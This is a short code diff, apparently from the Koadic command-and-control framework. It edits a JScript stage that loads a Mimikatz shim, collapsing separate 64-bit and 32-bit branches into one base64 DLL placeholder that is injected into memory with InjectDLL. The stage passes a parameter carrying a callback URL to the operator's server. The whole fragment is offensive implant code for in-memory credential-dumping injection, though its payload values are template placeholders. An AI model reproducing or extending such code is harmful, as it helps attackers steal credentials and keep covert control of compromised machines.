@@ -129,13 +129,8 @@ try {
 	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
 
   var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();
-  if (Koadic.user.Arch() == "AMD64") {
-  	var base64DLL = ~SHIMX64B64~
-  	o.InjectDLL(base64DLL, shim_lpParam, ~SHIMX64OFFSET~);
- 	} else {
- 		var base64DLL = ~SHIMX86B64~
- 		o.InjectDLL(base64DLL, shim_lpParam, ~SHIMX86OFFSET~);
-	}
+  var base64DLL = ~SHIMB64~
+  o.InjectDLL(base64DLL, shim_lpParam, ~SHIMOFFSET~);
   Koadic.work.report("Done");
 } catch (e) {
   Koadic.work.error(e);
